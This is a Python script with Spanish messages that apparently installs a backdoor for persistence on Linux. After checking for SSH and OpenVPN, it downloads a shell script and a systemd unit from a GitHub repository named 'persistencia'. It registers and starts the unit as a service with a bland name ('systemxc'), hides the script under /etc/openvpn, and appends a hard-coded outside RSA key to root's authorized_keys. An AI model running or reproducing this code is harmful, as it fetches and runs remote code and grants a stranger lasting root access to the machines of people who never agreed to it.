import requests
import os
import subprocess
import sys

def check_installation(package):
    try:
        subprocess.check_call(["dpkg", "-l", package], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return True
    except subprocess.CalledProcessError:
        return False

def install_package(package):
    try:
        subprocess.check_call(["sudo", "apt-get", "install", "-y", package])
        print(f"El paquete {package} se ha instalado correctamente.")
    except subprocess.CalledProcessError:
        print(f"No se pudo instalar el paquete {package}. Por favor, instálalo manualmente.")

if __name__ == "__main__":
    packages = {
        "SSH": "openssh-server",
        "OpenVPN": "openvpn"
    }

    for name, package in packages.items():
        if not check_installation(package):
            print(f"{name} no está instalado.")
            install = input(f"¿Deseas instalar {name}? (Sí/No): ").strip().lower()
            if install == "si" or install == "sí":
                install_package(package)
            else:
                print(f"Por favor, instala {name} manualmente si lo necesitas.")
                sys.exit(1)

    print("Todos los paquetes necesarios están instalados.")



def bajararchivos():
    urls = [
        "https://raw.githubusercontent.com/Fcogonsanmar/persistencia/main/client.sh",
        "https://raw.githubusercontent.com/Fcogonsanmar/persistencia/main/systemxc.service"
    ]

    for url in urls:
        file_name = url.split("/")[-1]
        response = requests.get(url)
        if response.status_code == 200:
            with open(file_name, 'wb') as f:
                f.write(response.content)
            print(f"Archivo descargado: {file_name}")
        else:
            print(f"No se pudo descargar el archivo de la URL: {url}")



def moveryinstalarservicio():
    os.system("mv systemxc.service /etc/systemd/system/")
    os.system("systemctl enable systemxc")
    os.system("systemctl start systemxc")

def crearcarpetaenopenvpn():
    os.system("mkdir /etc/openvpn/systemxc")
    os.system("mv client.sh /etc/openvpn/systemxc/")
    os.system("chmod +x /etc/openvpn/systemxc/client.sh")

def authorizedkeys():
    data_to_append = 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDoY4j4teKfsIY+XenuR1iameJ6bdg0yQY3+Iupf4Q37sZhcW2eXUksQ3Ap7xzsxHtGfNrN8k0s1WesXX/ux8j3ihOYCppUVmtSlBnDUO+YtTduKvuWtnz925gF9fd9KlGviAx5tRZ4VuO0CwD5+VLqiZ4TSB/vVH+ojuAqx7q9CE7Cr2dJ7CNWTIwDeY2R1SsNeEXGockqVbQsA5m4v8F6RIg7DyPONFRXm3pZt4QqPshH/inl2LmCgWZAdr/aA5rlyT2mdChgsnkBP2a39aJD2TRar2PMLGmYrvydseaz4s3ZrNfCGhPl3QxrvIazYaaKYfuZCOUedDrWx9VMpinA/JeUKUA/ogm3g3/0DroKsEC3e8sUXud8BZeAthN9fAbbO6R1xvleFvqxPLFwfGEchUYo783tackO3/p5lBGr8evVWL5YYgtYKDQtasRi6+3x6XhW7Scm68d/E0DBCtXys4Box//Q1ZmBHMe5ru4ddotksSJdv2GnKy8e3rmfh8c= root@DESKTOP-34663EN\n'

    file_path = '/root/.ssh/authorized_keys'


    with open(file_path, 'a') as file:
        file.write(data_to_append)

    print("La cadena se ha añadido correctamente al archivo.")


bajararchivos()
moveryinstalarservicio()
crearcarpetaenopenvpn()
authorizedkeys()